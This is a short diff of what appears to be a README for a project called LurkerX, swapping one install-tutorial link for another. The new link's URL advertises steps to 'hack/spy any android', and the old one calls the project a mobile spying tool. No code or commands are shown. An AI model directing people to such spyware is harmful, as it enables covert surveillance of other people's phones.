@@ -27,7 +27,7 @@ https://github.com/the-hollowclan/LurkerX/code/of/conduct
 
 Use this link to install:
 
-<a href="https://blacksamaritan.blogspot.com/2025/12/a-newly-emerged-mobile-spying-tool.html">
+<a href="https://blacksamaritan.blogspot.com/2026/08/10-easy-steps-to-hackspy-any-android.html">
   <img src="https://img.shields.io/badge/HOW TO INSTALL AND USE(TUTORIAL)-teal?style=for-the-badge&logo=website">
 </a>
 <a href="docs/install_docker.md">
